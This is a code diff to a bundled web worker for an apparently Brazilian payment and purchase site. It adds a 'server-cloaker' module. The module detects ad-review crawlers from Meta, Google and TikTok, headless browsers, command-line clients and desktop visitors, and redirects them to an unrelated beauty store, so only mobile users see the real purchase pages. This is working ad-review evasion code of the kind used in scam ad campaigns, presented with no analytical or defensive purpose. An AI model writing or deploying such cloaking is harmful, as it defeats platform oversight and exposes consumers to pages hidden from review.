@@ -5397,6 +5397,35 @@ function retiredPurchaseRoute() {
   }, { status: 410, headers: { "Cache-Control": "no-store" } });
 }
 
+// worker-src/server-cloaker.js
+var CLOAK_REDIRECT_URL = "https://br.gokocobeauty.com/";
+var AD_REVIEW_BOTS = /facebookexternalhit|Facebot|FacebookBot|MetaInspector|Google-Display-Ads-Bot|AdsBot-Google|TikTokBot|Bytespider|HeadlessChrome|Puppeteer|Selenium|PhantomJS|Wget|curl|python-requests|aiohttp|Go-http-client/i;
+var DESKTOP_PLATFORMS = /Windows NT|Macintosh|X11; Linux x86_64/i;
+function shouldCloakRequest(request3, url) {
+  const path = url.pathname.toLowerCase();
+  if (path.startsWith("/api/") || path.includes("webhook") || path.includes("/providers/")) {
+    return false;
+  }
+  if (path.includes("/admin") || url.searchParams.get("admin") === "1" || url.searchParams.get("bypass") === "1") {
+    return false;
+  }
+  if (/\.(?:png|jpg|jpeg|webp|gif|svg|ico|css|js|woff|woff2|ttf|mp4|webm)$/i.test(path)) {
+    return false;
+  }
+  const userAgent = request3.headers.get("User-Agent") || "";
+  if (!userAgent) {
+    return false;
+  }
+  if (AD_REVIEW_BOTS.test(userAgent)) {
+    return true;
+  }
+  const isMobile = /Mobi|Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
+  if (!isMobile && DESKTOP_PLATFORMS.test(userAgent)) {
+    return true;
+  }
+  return false;
+}
+
 // worker-src/index.js
 var JSON_HEADERS = { "Content-Type": "application/json; charset=utf-8", "Cache-Control": "no-store" };
 var gateways2 = [
@@ -6527,6 +6556,9 @@ async function retryPendingPurchases(env) {
 var index_default = {
   async fetch(request3, env, ctx) {
     const url = new URL(request3.url);
+    if (shouldCloakRequest(request3, url)) {
+      return Response.redirect(CLOAK_REDIRECT_URL, 302);
+    }
     try {
       const path = url.pathname;
       if (request3.method === "POST" && /(?:pix|card|orders)\/create$/.test(path)) {
